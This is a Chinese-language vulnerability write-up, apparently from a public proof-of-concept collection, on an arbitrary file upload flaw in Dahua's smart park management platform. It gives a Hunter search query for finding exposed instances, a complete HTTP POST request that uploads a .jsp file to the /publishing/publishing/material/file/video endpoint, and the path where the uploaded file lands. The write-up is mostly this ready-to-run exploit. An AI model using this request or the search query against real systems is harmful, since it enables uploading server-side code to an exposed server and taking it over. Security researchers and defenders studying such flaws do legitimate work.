# 大华智慧园区综合管理平台video任意文件上传漏洞

# 一、漏洞描述
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 大华智慧园区综合管理平台存在文件上传漏洞，攻击者可以通过请求publishing/publishing/material/file/video接口任意上传文件，导致系统被攻击与控制。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  

+ 登录页面：


# 四、漏洞复现
```plain
POST /publishing/publishing/material/file/video HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 287

--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="1ndex.jsp"

test
--00content0boundary00
Content-Disposition: form-data; name="file"

file
--00content0boundary00
Content-Disposition: form-data; name="Submit"

submit
--00content0boundary00--

```


上传文件位置：

```plain
/publishingImg/VIDEO/230812162057144051.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lggztymnkglaq1p9>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
